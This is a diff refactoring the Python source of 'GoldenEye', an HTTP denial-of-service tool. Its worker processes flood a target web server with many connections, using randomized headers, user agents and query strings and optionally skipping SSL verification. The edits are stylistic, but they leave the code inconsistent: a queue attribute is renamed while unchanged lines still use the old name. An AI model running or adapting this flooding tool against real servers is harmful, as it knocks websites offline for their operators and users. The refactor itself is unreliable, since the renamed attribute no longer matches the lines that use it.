@@ -39,6 +39,8 @@ THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
 BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 """
 
+
+import contextlib
 from multiprocessing import Process, Manager, Pool
 import urllib.parse, ssl
 import sys, getopt, random, time, os
@@ -77,12 +79,12 @@ USER_AGENT_PARTS = {
         },
         'mac': {
             'name': ['Macintosh'],
-            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
+            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for _ in range(1, 10)]
         },
     },
     'platform': {
         'webkit': {
-            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
+            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for _ in range(1, 30)],
             'details': ['KHTML, like Gecko'],
             'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
         },
@@ -112,7 +114,7 @@ class GoldenEye(object):
     last_counter = [0, 0]
 
     # Containers
-    workersQueue = []
+    workers_queue = []
     manager = None
     useragents = []
 
@@ -143,7 +145,7 @@ class GoldenEye(object):
     def __del__(self):
         self.exit()
 
-    def printHeader(self):
+    def printheader(self):
 
         # Taunt!
         print()
@@ -153,7 +155,7 @@ class GoldenEye(object):
     # Do the fun!
     def fire(self):
 
-        self.printHeader()
+        self.printheader()
         print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets))
 
         if DEBUG:
@@ -172,15 +174,13 @@ class GoldenEye(object):
                 worker.start()
             except Exception:
                 error("Failed to start worker {0}".format(i))
-                pass
-
         if DEBUG:
             print("Initiating monitor")
         self.monitor()
 
     def stats(self):
 
-        try:
+        with contextlib.suppress(Exception):
             if self.counter[0] > 0 or self.counter[1] > 0:
 
                 print("{0} GoldenEye strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))
@@ -190,8 +190,6 @@ class GoldenEye(object):
 
                 self.last_counter[0] = self.counter[0]
                 self.last_counter[1] = self.counter[1]
-        except Exception:
-            pass # silently ignore
 
     def monitor(self):
         while len(self.workersQueue) > 0:
@@ -207,17 +205,14 @@ class GoldenEye(object):
             except (KeyboardInterrupt, SystemExit):
                 print("CTRL+C received. Killing all workers")
                 for worker in self.workersQueue:
-                    try:
+                    with contextlib.suppress(Exception):
                         if DEBUG:
                             print("Killing worker {0}".format(worker.name))
                         #worker.terminate()
                         worker.stop()
-                    except Exception:
-                        pass # silently ignore
                 if DEBUG:
                     raise
-                else:
-                    pass
+
 
 ####
 # Striker Class
@@ -254,18 +249,18 @@ class Striker(Process):
         self.counter = counter
         self.nr_socks = nr_sockets
 
-        parsedUrl = urllib.parse.urlparse(url)
+        parsedurl = urllib.parse.urlparse(url)
 
-        if parsedUrl.scheme == 'https':
+        if parsedurl.scheme == 'https':
             self.ssl = True
 
-        self.host = parsedUrl.netloc.split(':')[0]
-        self.url = parsedUrl.path
+        self.host = parsedurl.netloc.split(':')[0]
+        self.url = parsedurl.path
 
-        self.port = parsedUrl.port
+        self.port = parsedurl.port
 
         if not self.port:
-            self.port = 80 if not self.ssl else 443
+            self.port = 443 if self.ssl else 80
 
 
         self.referers = [
@@ -291,7 +286,7 @@ class Striker(Process):
 
         validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
 
-        for i in range(0, size):
+        for _ in range(size):
             a = random.choice(validChars)
             out_str += chr(a)
 
@@ -306,14 +301,10 @@ class Striker(Process):
         while self.runnable:
 
             try:
-
-                for i in range(self.nr_socks):
-
+                for _ in range(self.nr_socks):
                     if self.ssl:
-                        if SSLVERIFY:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
-                        else:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
+                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port) if SSLVERIFY else HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
+
                     else:
                         c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
@@ -334,22 +325,17 @@ class Striker(Process):
 
                 self.closeConnections()
 
-            except:
+            except Exception:
                 self.incFailed()
                 if DEBUG:
                     raise
-                else:
-                    pass # silently ignore
-
         if DEBUG:
             print("Worker {0} completed run. Sleeping...".format(self.name))
 
     def closeConnections(self):
         for conn in self.socks:
-            try:
+            with contextlib.suppress(Exception):
                 conn.close()
-            except:
-                pass # silently ignore
 
 
     def createPayload(self):
@@ -358,10 +344,7 @@ class Striker(Process):
 
         random_keys = list(headers.keys())
         random.shuffle(random_keys)
-        random_headers = {}
-
-        for header_name in random_keys:
-            random_headers[header_name] = headers[header_name]
+        random_headers = {header_name: headers[header_name] for header_name in random_keys}
 
         return (req_url, random_headers)
 
@@ -369,7 +352,7 @@ class Striker(Process):
 
         queryString = []
 
-        for i in range(ammount):
+        for _ in range(ammount):
 
             key = self.buildblock(random.randint(3,10))
             value = self.buildblock(random.randint(3,20))
@@ -378,23 +361,15 @@ class Striker(Process):
 
         return '&'.join(queryString)
 
-
     def generateData(self):
-
-        returnCode = 0
-        param_joiner = "?"
 
         if len(self.url) == 0:
             self.url = '/'
 
-        if self.url.count("?") > 0:
-            param_joiner = "&"
-
+        param_joiner = "&" if self.url.count("?") > 0 else "?"
         request_url = self.generateRequestUrl(param_joiner)
-
         http_headers = self.generateRandomHeaders()
-
-
+        
         return (request_url, http_headers)
 
     def generateRequestUrl(self, param_joiner = '?'):
@@ -513,16 +488,12 @@ class Striker(Process):
 
     # Counter Functions
     def incCounter(self):
-        try:
+        with contextlib.suppress(Exception):
             self.counter[0] += 1
-        except Exception:
-            pass
 
     def incFailed(self):
-        try:
+        with contextlib.suppress(Exception):
             self.counter[1] += 1
-        except Exception:
-            pass
 
 
 
@@ -576,10 +547,10 @@ def main():
             usage()
             sys.exit()
 
-        if url[0:4].lower() != 'http':
+        if url[:4].lower() != 'http':
             error("Invalid URL supplied")
 
-        if url == None:
+        if url is None:
             error("No URL supplied")
 
         opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])
